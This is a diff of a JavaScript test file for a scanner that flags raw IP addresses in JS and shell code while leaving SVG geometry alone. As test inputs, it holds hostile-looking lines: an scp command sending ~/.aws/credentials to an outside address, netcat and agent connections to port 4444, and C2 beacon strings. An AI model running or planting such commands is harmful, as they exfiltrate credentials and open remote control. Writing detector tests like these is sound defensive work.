@@ -369,26 +369,25 @@ test("svg path data is geometry, not a network address", () => {
   expect(kinds(scanJs(icon))).not.toContain("raw_ip");
 });
 
-test("a bare address in a string literal is still a network address", () => {
-  expect(kinds(scanJs('const c2 = "185.62.190.9";'))).toContain("raw_ip");
-  expect(kinds(scanJs("net.connect(4444, '203.0.113.42');"))).toContain("raw_ip");
+test("geometry with exponent notation and negative coordinates is still geometry", () => {
+  expect(kinds(scanJs('const d = "M0 0L1e-3 2.5.7.7-1.3z";'))).not.toContain("raw_ip");
 });
 
-test("an address with an explicit port is a network address wherever it appears", () => {
-  expect(kinds(scanJs('send("beacon 203.0.113.42:4444 now");'))).toContain("raw_ip");
+test("an address is not excused by sitting next to numbers", () => {
+  expect(kinds(scanJs('const c2 = "203.0.113.42 4444";'))).toContain("raw_ip");
+  expect(kinds(scanJs('const c2 = "  203.0.113.42  ";'))).toContain("raw_ip");
+  expect(kinds(scanJs('const peers = ["203.0.113.42"];'))).toContain("raw_ip");
 });
 
-test("an address followed by a path is a network address", () => {
-  expect(kinds(scanJs('const u = "grab 203.0.113.42/collect";'))).toContain("raw_ip");
+test("an install script that hands an address to any binary is still caught", () => {
+  expect(kinds(scanShell("scp -q ~/.aws/credentials 203.0.113.42:/tmp/c"))).toContain("raw_ip");
+  expect(kinds(scanShell("./bin/agent 203.0.113.42 4444 &"))).toContain("raw_ip");
+  expect(kinds(scanShell("sh -c 'exfil --to 203.0.113.42 --now'"))).toContain("raw_ip");
+  expect(kinds(scanShell("echo 203.0.113.42 >> ~/.config/.peer"))).toContain("raw_ip");
 });
 
-test("an address named as a host is a network address even without a port or scheme", () => {
-  expect(kinds(scanShell("nc 203.0.113.42 4444"))).toContain("raw_ip");
-  expect(kinds(scanShell("ping 203.0.113.42"))).toContain("raw_ip");
-});
-
-test("coordinate runs in a shell script are not addresses", () => {
-  expect(kinds(scanShell("echo 1.5 3.5.7.7 1.3"))).not.toContain("raw_ip");
+test("a config blob carrying a command and control address is still caught", () => {
+  expect(kinds(scanJs('{"config":{"beacon":"203.0.113.42"}}'))).toContain("raw_ip");
 });
 
 test("private and loopback ranges stay excluded", () => {
